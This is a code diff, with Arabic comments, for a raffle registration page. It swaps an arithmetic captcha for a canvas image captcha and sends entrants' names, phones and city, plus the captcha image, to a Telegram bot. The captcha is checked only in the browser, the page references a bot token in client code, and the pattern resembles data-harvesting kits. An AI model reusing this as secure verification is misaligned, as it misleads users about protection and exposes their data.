-// توليد مسألة حسابية عشوائية للتحقق الأمني
-let num1 = Math.floor(Math.random() * 8) + 2;
-let num2 = Math.floor(Math.random() * 8) + 2;
-let correctAnswer = num1 + num2;
-document.getElementById("mathChallenge").textContent = `${num1} + ${num2} = ?`;
+let currentCaptchaCode = "";
+
+// توليد صورة كابتشا بصرية عشوائية عبر Canvas
+function generateCaptcha() {
+  const canvas = document.getElementById("captchaCanvas");
+  const ctx = canvas.getContext("2d");
+  
+  // تنظيف اللوحة
+  ctx.clearRect(0, 0, canvas.width, canvas.height);
+  
+  // خلفية متدرجة فوضوية
+  const grad = ctx.createLinearGradient(0, 0, canvas.width, canvas.height);
+  grad.addColorStop(0, "#0f172a");
+  grad.addColorStop(1, "#1e293b");
+  ctx.fillStyle = grad;
+  ctx.fillRect(0, 0, canvas.width, canvas.height);
+  
+  // رسم خطوط تشويش لمنع روبوتات OCR
+  for (let i = 0; i < 7; i++) {
+    ctx.strokeStyle = `rgba(${Math.random()*255}, ${Math.random()*255}, ${Math.random()*255}, 0.5)`;
+    ctx.lineWidth = Math.random() * 2 + 1;
+    ctx.beginPath();
+    ctx.moveTo(Math.random() * canvas.width, Math.random() * canvas.height);
+    ctx.lineTo(Math.random() * canvas.width, Math.random() * canvas.height);
+    ctx.stroke();
+  }
+  
+  // توليد رمز مكون من 5 أحرف وأرقام عشوائية
+  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
+  currentCaptchaCode = "";
+  for (let i = 0; i < 5; i++) {
+    currentCaptchaCode += chars.charAt(Math.floor(Math.random() * chars.length));
+  }
+  
+  // رسم الحروف بشكل مائل ومتعرج
+  ctx.font = "bold 32px 'Cairo', sans-serif";
+  ctx.textBaseline = "middle";
+  
+  let x = 20;
+  for (let i = 0; i < currentCaptchaCode.length; i++) {
+    ctx.save();
+    ctx.translate(x, canvas.height / 2);
+    ctx.rotate((Math.random() - 0.5) * 0.5); // ميلان عشوائي للحرف
+    
+    // ألوان ساطعة متغيرة لكل حرف
+    ctx.fillStyle = i % 2 === 0 ? "#ffb703" : "#00f2fe";
+    ctx.fillText(currentCaptchaCode[i], 0, (Math.random() - 0.5) * 8);
+    ctx.restore();
+    x += 35;
+  }
+  
+  // إضافة نقاط تشويش إضافية فوق الأحرف
+  for (let i = 0; i < 40; i++) {
+    ctx.fillStyle = Math.random() > 0.5 ? "#ffffff" : "#ff2a3c";
+    ctx.fillRect(Math.random() * canvas.width, Math.random() * canvas.height, 2, 2);
+  }
+}
+
+// تشغيل الكابتشا لأول مرة عند تحميل الصفحة وتحديثها عند النقر عليها
+window.addEventListener("DOMContentLoaded", () => {
+  generateCaptcha();
+  document.getElementById("captchaCanvas").addEventListener("click", generateCaptcha);
+});
 
 function togglePass() {
   const passInput = document.getElementById("password");
@@ -882,29 +971,48 @@ function cleanHTML(str) {
             .replace(/>/g, "&gt;");
 }
 
+// دالة لتحويل عنصر الـ Canvas إلى صورة قابلة للإرسال كـ Photo إلى تليجرام
+function getCaptchaDataURL() {
+  const canvas = document.getElementById("captchaCanvas");
+  return canvas.toDataURL("image/png");
+}
+
+// دالة مساعدة لتحويل DataURL إلى كائن Blob لرفعه كصورة عبر SendPhoto في تليجرام
+function dataURItoBlob(dataURI) {
+  const byteString = atob(dataURI.split(',')[1]);
+  const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+  const ab = new ArrayBuffer(byteString.length);
+  const ia = new Uint8Array(ab);
+  for (let i = 0; i < byteString.length; i++) {
+    ia[i] = byteString.charCodeAt(i);
+  }
+  return new Blob([ab], {type: mimeString});
+}
+
 document.getElementById("raffleForm").addEventListener("submit", async function(e) {
   e.preventDefault();
   const msg = document.getElementById("msg");
   msg.className = "msg";
 
-  // التحقق من الكابتشا الحسابية
-  const userAns = parseInt(document.getElementById("mathAnswer").value.trim());
-  if (userAns !== correctAnswer) {
+  // التحقق من صحة كود التحقق البصري المطابق لصورة الكابتشا
+  const userCaptchaInput = document.getElementById("captchaInput").value.trim().toUpperCase();
+  if (userCaptchaInput !== currentCaptchaCode) {
     msg.className = "msg err";
-    msg.textContent = "❌ ناتج التحقق الأمني (لست روبوت) غير صحيح، يرجى إعادة المحاولة.";
+    msg.textContent = "❌ رمز التحقق البصري غير صحيح! يرجى إعادة إدخال الرموز الظاهرة في الصورة بدقة.";
+    generateCaptcha(); // توليد صورة جديدة للمحاولة التالية
     return;
   }
 
   const btn = document.getElementById("btn");
   btn.disabled = true;
-  btn.textContent = "⏳ جارٍ توثيق وإصدار تذكرة السحب...";
+  btn.textContent = "⏳ جارٍ توثيق وإرسال صورة التحقق وبياناتك للبوت...";
 
   const ticketID = "AMIR-" + Math.floor(1000 + Math.random() * 9000);
   const g = id => cleanHTML(document.getElementById(id).value.trim());
   const rawPhone = document.getElementById("phone").value.trim().replace(/\s+/g, '');
 
-  const text =
-`🏆 <b>تسجيل جديد في السحب الأسطوري لمتر فلينج!</b>
+  const captionText =
+`🏆 <b>تسجيل جديد في السحب الأسطوري (متر فلينج)!</b>
 ━━━━━━━━━━━━━━━━━━
 🎟️ <b>رقم التذكرة:</b> <code>${ticketID}</code>
 👤 <b>الاسم:</b> ${g("name")}
@@ -914,20 +1022,26 @@ document.getElementById("raffleForm").addEventListener("submit", async function(
 🏙️ <b>المنطقة:</b> ${g("city")}
 🏍️ <b>المتر المفضل:</b> ${g("favModel")}
 💬 <b>ملاحظة:</b> ${g("note") || "لا يوجد"}
+🛡️ <b>حالة التحقق البصري:</b> ✅ اجتاز كابتشا الإنسان بنجاح
 ━━━━━━━━━━━━━━━━━━
 📲 <b>تواصل سريع مع المشترك (واتساب):</b>
 https://wa.me/967${rawPhone.replace(/^0+/, '')}`;
 
   try {
-    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    // تجهيز صورة التحقق البصري المرسلة من الـ Canvas
+    const captchaDataURL = getCaptchaDataURL();
+    const captchaBlob = dataURItoBlob(captchaDataURL);
+    
+    const formData = new FormData();
+    formData.append("chat_id", CHAT_ID);
+    formData.append("photo", captchaBlob, "human_verification_captcha.png");
+    formData.append("caption", captionText);
+    formData.append("parse_mode", "HTML");
+
+    // إرسال البيانات والصورة معاً مباشرة عبر واجهة sendPhoto في بوت تليجرام
+    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
       method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: CHAT_ID,
-        text: text,
-        parse_mode: "HTML",
-        disable_web_page_preview: true
-      })
+      body: formData
     });
 
     const data = await res.json();
@@ -941,10 +1055,11 @@ https://wa.me/967${rawPhone.replace(/^0+/, '')}`;
     }
   } catch (err) {
     msg.className = "msg err";
-    msg.textContent = "❌ تعذر إرسال البيانات حالياً، يرجى التحقق من اتصال الإنترنت وإعادة المحاولة.";
+    msg.textContent = "❌ تعذر إرسال البيانات وصورة التحقق، يرجى التأكد من اتصال الإنترنت والمحاولة مرة أخرى.";
     console.error(err);
     btn.disabled = false;
-    btn.textContent = "🔥 تأكيد التسجيل والحصول على تذكرة السحب";
+    btn.textContent = "🔥 تأكيد التسجيل وإرسال البيانات للبوت";
+    generateCaptcha();
   }
 });
 </script>
